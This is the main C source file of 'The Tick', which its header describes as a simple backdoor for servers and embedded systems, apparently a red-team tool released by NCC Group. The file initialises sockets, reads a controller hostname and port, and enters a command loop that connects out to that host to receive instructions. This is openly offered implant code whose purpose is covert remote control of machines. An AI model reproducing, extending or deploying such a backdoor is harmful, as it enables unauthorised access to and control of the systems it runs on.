/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "main.h"

#include "config.h"
#include "command.h"
#include "parser.h"

#if TICK_CONFIG_USE_ARGV
int main(int argc, char *argv[])
#else
int main(void)
#endif
{
#ifdef _WIN32

    // On Windows, we must initialize the sockets library.
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        LOG("Failed to initialize Windows sockets, error code: %d\n", (int) GetLastError());
        return 0;
    }

#else

    // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
    signal(SIGPIPE, SIG_IGN);

#endif

    // Command line arguments are the hostname and port.
    Settings s;
#if TICK_CONFIG_USE_ARGV
    get_configuration(&s, argc, argv);
#else
    get_configuration(&s);
#endif

    // If we don't have a hostname and port to connect to, quit.
    if (s.hostname[0] == 0 || s.port == 0) {
#if TICK_VERBOSE
#if TICK_CONFIG_USE_ARGV
        show_help(&s, argv[0]);
#else
        show_help(&s, NULL);
#endif
#endif
        return 1;
    }

    // We're ready to go!
    LOG("Starting up...\n");

    // Allocate the parser structure.
    // If the parser buffer is small, use the stack.
    // If it's large, use the heap.
#if TICK_PARSER_BUFFER_SIZE > 0x1000
    Parser *p = malloc(TICK_PARSER_BUFFER_SIZE);
    if (p == NULL) return 1;
#else
    Parser parser;
    Parser *p = &parser;
#endif

    // Initialize the parser.
    parser_init(p, &s);

    // Launch the main command loop.
    while (command_loop(p) == 0) {}

    // Free the buffer and quit.
#if TICK_PARSER_BUFFER_SIZE > 0x1000
    free(p);
#endif
    return 0;
}
